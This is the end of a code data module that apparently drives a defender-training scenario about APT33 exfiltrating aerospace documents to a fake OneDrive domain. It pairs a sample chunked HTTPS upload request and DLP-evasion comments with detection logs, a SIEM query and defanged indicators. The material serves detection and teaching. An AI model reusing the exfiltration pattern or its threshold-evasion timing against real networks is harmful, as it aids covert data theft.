              "APT33 exfiltrated staged aerospace documents using cloud storage services and web-based exfil channels to blend with legitimate corporate cloud usage. TURNEDUP uploaded AES-256 encrypted archives to actor-controlled OneDrive/Dropbox lookalike infrastructure over HTTPS, ensuring exfil traffic appeared identical to normal employee cloud sync traffic. Multiple small transfers over time avoided data volume thresholds.",
            tools: ["TURNEDUP RAT exfil module", "Custom HTTPS uploader", "OneDrive/cloud storage mimicry"],
            commands: [
              "// TURNEDUP HTTPS upload to cloud-lookalike C2",
              "POST /api/v2/sync/upload HTTP/1.1",
              "Host: onedrive-corp[.]com",
              "Content-Type: application/octet-stream",
              "Authorization: Bearer <token>",
              "// Chunked transfer: 2 MB segments every 8 minutes to stay under DLP thresholds",
              "// Total exfil volume: ~4–8 GB over 3–5 day period per target",
              "// Traffic fingerprint: identical to legitimate Microsoft OneDrive sync",
            ],
          },
          defender: {
            logs: [
              "HTTPS uploads to non-approved cloud storage domain from workstation (CASB / proxy log)",
              "Sustained chunked uploads to single domain over multi-day period (NetFlow baseline deviation)",
              "DLP alert: archive file (7z/zip) upload to uncategorized cloud service (DLP engine)",
              "DNS query for onedrive-* or dropbox-* typosquat domains (DNS filtering alert)",
            ],
            detection:
              "CASB: whitelist approved cloud storage domains and alert on uploads to all others. DNS: block newly-registered domains matching cloud provider naming patterns. DLP: encrypted archive uploads to personal cloud services should alert regardless of size. SSL inspection of outbound HTTPS reveals encrypted archives versus legitimate cloud sync traffic patterns.",
            siemQuery:
              'index=proxy action=allowed category NOT IN ("approved_cloud","business_cloud") bytes_out > 500000 | stats sum(bytes_out) as total by src_ip, dest_domain | where total > 10000000 | sort -total',
            ifMissed:
              "Gigabytes of proprietary US and Saudi aerospace engineering data is transferred to Iranian intelligence-controlled infrastructure. Stolen IP includes Boeing avionics specifications, Raytheon radar and missile guidance data, and Saudi defense procurement contract details. This information directly accelerates Iranian domestic aerospace development programs and provides strategic military intelligence. Attribution is complicated by cloud-mimicry infrastructure.",
          },
          iocs: [
            { type: "Domain", indicator: "onedrive-corp[.]com", description: "APT33 cloud exfiltration C2 domain impersonating Microsoft OneDrive — used for TURNEDUP encrypted archive uploads" },
            { type: "IP", indicator: "185.25.51[.]198", description: "APT33 exfiltration server IP behind fake cloud storage domain — receives chunked encrypted aerospace document archives" },
            { type: "URL Pattern", indicator: "/api/v2/sync/upload (chunked, Content-Type: application/octet-stream)", description: "TURNEDUP exfil HTTP pattern mimicking cloud storage sync API — used to blend exfil with legitimate OneDrive traffic" },
          ],
        },
      ],
    },
  ],
}

export default apt33
